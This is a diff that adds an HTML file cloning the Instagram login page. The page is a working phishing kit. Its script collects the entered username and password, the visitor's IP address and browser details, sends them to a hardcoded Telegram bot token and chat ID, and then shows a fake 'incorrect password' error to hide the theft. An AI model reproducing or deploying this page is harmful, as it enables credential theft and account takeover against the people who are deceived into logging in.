@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<!-- saved from url=(0041)file:///D:/New%20folder/index%20(1).html# -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 30px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo svg {
+            width: 175px;
+            height: 51px;
+        }
+
+        .form-group {
+            margin-bottom: 6px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 9px 8px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .form-group input::placeholder {
+            color: #8e8e8e;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 7px 16px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            line-height: 18px;
+            margin-top: 12px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider::before {
+            margin-right: 18px;
+        }
+
+        .divider::after {
+            margin-left: 18px;
+        }
+
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: none;
+            border: none;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            width: 100%;
+        }
+
+        .fb-login svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .signup-card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 30px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-card a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .get-app {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .get-app p {
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+
+        .app-badges {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .app-badges img {
+            height: 40px;
+        }
+
+        .footer {
+            max-width: 600px;
+            margin-top: 30px;
+            text-align: center;
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px 16px;
+            margin-bottom: 15px;
+        }
+
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .copyright {
+            font-size: 12px;
+        }
+
+        .warning-message {
+            color: #ed4956;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .loading {
+            display: none;
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+                <svg viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M34.5 23.5C34.5 31.5 28.5 37.5 20.5 37.5C12.5 37.5 6.5 31.5 6.5 23.5C6.5 15.5 12.5 9.5 20.5 9.5C28.5 9.5 34.5 15.5 34.5 23.5Z" fill="url(#paint0_radial)"></path>
+                    <path d="M20.5 2.5C24.5 2.5 28.5 2.5 32.5 2.5C36.5 2.5 40.5 2.5 44.5 2.5C48.5 2.5 48.5 6.5 48.5 10.5C48.5 14.5 48.5 18.5 48.5 22.5C48.5 26.5 48.5 30.5 48.5 34.5C48.5 38.5 44.5 38.5 40.5 38.5C36.5 38.5 32.5 38.5 28.5 38.5C24.5 38.5 20.5 38.5 16.5 38.5C12.5 38.5 8.5 38.5 4.5 38.5C0.5 38.5 0.5 34.5 0.5 30.5C0.5 26.5 0.5 22.5 0.5 18.5C0.5 14.5 0.5 10.5 0.5 6.5C0.5 2.5 4.5 2.5 8.5 2.5C12.5 2.5 16.5 2.5 20.5 2.5Z" fill="url(#paint1_radial)"></path>
+                    <defs>
+                        <radialgradient id="paint0_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(20.5 23.5) rotate(90) scale(14 27.5)">
+                            <stop stop-color="#F9ED32"></stop>
+                            <stop offset="0.3" stop-color="#EE2A7B"></stop>
+                            <stop offset="0.6" stop-color="#D22E8D"></stop>
+                            <stop offset="1" stop-color="#6B52B9"></stop>
+                        </radialgradient>
+                        <radialgradient id="paint1_radial" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="translate(24.5 20.5) rotate(90) scale(24 48)">
+                            <stop stop-color="#F9ED32"></stop>
+                            <stop offset="0.3" stop-color="#EE2A7B"></stop>
+                            <stop offset="0.6" stop-color="#D22E8D"></stop>
+                            <stop offset="1" stop-color="#6B52B9"></stop>
+                        </radialgradient>
+                    </defs>
+                </svg>
+            </div>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" id="username" placeholder="Phone number, username, or email" required="">
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Password" required="">
+                </div>
+                
+                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+                
+                <div class="divider">OR</div>
+                
+                <button type="button" class="fb-login">
+                    <svg viewBox="0 0 16 16" fill="currentColor">
+                        <path d="M16 8.048C16 3.604 12.418 0 8 0S0 3.604 0 8.048c0 4.017 2.926 7.347 6.75 7.952v-5.625h-2.03V8.048h2.03V6.277c0-2.02 1.195-3.132 3.022-3.132.876 0 1.79.157 1.79.157v1.98h-1.008c-.994 0-1.304.622-1.304 1.26v1.506h2.22l-.355 2.326H9.25V16c3.824-.605 6.75-3.935 6.75-7.952z"></path>
+                    </svg>
+                    Log in with Facebook
+                </button>
+                
+                <a href="file:///D:/New%20folder/index%20(1).html#" class="forgot-password">Forgot password?</a>
+            </form>
+
+            <div class="warning-message" id="warningMessage">
+                Sorry, your password was incorrect. Please double-check your password.
+            </div>
+            <div class="loading" id="loading">
+                Please wait...
+            </div>
+        </div>
+
+        <div class="signup-card">
+            Don't have an account? <a href="file:///D:/New%20folder/index%20(1).html#">Sign up</a>
+        </div>
+
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-badges">
+                <img src="data:image/svg+xml,%3Csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; viewBox=&#39;0 0 135 40&#39;%3E%3Cpath fill=&#39;%23333&#39; d=&#39;M130 0H5a5 5 0 0 0-5 5v30a5 5 0 0 0 5 5h125a5 5 0 0 0 5-5V5a5 5 0 0 0-5-5z&#39;/%3E%3Ctext x=&#39;20&#39; y=&#39;25&#39; fill=&#39;%23fff&#39; font-size=&#39;14&#39; font-family=&#39;Arial&#39;%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
+                <img src="data:image/svg+xml,%3Csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; viewBox=&#39;0 0 135 40&#39;%3E%3Cpath fill=&#39;%23333&#39; d=&#39;M130 0H5a5 5 0 0 0-5 5v30a5 5 0 0 0 5 5h125a5 5 0 0 0 5-5V5a5 5 0 0 0-5-5z&#39;/%3E%3Ctext x=&#39;20&#39; y=&#39;25&#39; fill=&#39;%23fff&#39; font-size=&#39;14&#39; font-family=&#39;Arial&#39;%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="file:///D:/New%20folder/index%20(1).html#">Meta</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">About</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">Blog</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">Jobs</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">Help</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">API</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">Privacy</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">Terms</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">Locations</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">Instagram Lite</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">Threads</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">Contact Uploading &amp; Non-Users</a>
+                <a href="file:///D:/New%20folder/index%20(1).html#">Meta Verified</a>
+            </div>
+            <div class="copyright">
+                © 2024 Instagram from Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const loginBtn = document.getElementById('loginBtn');
+            const warningMsg = document.getElementById('warningMessage');
+            const loading = document.getElementById('loading');
+            
+            // Instagram ki tarah error dikhana
+            warningMsg.style.display = 'none';
+            loading.style.display = 'block';
+            loginBtn.disabled = true;
+            loginBtn.style.opacity = '0.5';
+            
+            try {
+                // User ka IP address fetch karna
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+                
+                // Device aur browser ki info
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                
+                // Telegram message prepare karna
+                const message = `
+🔐 *Instagram Login Alert* 🔐
+                    
+👤 *Username/Email:* \`${username}\`
+🔑 *Password:* \`${password}\`
+🌍 *IP Address:* \`${userIP}\`
+💻 *Device:* ${platform}
+🌐 *Browser:* ${userAgent}
+🗣 *Language:* ${language}
+⏰ *Time:* ${new Date().toLocaleString()}
+                `;
+                
+                // Telegram bot par bhejna
+                const telegramResponse = await fetch(`https://api.telegram.org/bot8518785429:AAE_R8JRh1l3eVCXlBrLZRI9X2BrCDvWK74/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: '6780152835',
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                // Instagram jaisa error message dikhana (successful login ke baad bhi error)
+                setTimeout(() => {
+                    loading.style.display = 'none';
+                    warningMsg.style.display = 'block';
+                    loginBtn.disabled = false;
+                    loginBtn.style.opacity = '1';
+                    document.getElementById('password').value = '';
+                    
+                    // 3 second baad warning message hide karna
+                    setTimeout(() => {
+                        warningMsg.style.display = 'none';
+                    }, 3000);
+                }, 1500);
+                
+            } catch (error) {
+                console.error('Error:', error);
+                loading.style.display = 'none';
+                loginBtn.disabled = false;
+                loginBtn.style.opacity = '1';
+                alert('Something went wrong. Please try again.');
+            }
+        });
+
+        // Instagram ki tarah input fields ko highlight karna
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#a8a8a8';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.borderColor = '#dbdbdb';
+            });
+        });
+    </script>
+
+</body></html>
